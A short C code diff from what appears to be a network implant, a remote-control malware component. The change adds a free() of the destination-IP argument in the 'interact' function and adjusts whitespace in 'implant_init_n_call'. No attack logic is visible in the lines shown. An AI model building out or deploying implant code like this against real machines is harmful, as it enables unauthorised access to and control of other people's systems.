@@ -196,6 +196,7 @@ void interact(int sockfd, char *dest_ip) {
         free(output);
     }
   
+    free(dest_ip);
     free(data);
     free(output);
     free(packet);
@@ -205,6 +206,6 @@ void interact(int sockfd, char *dest_ip) {
 // initializes the options and starts the implant
 void implant_init_n_call(char *dest_ip) {
     int sockfd = create_socket();
-
+    
     interact(sockfd, dest_ip);
 }
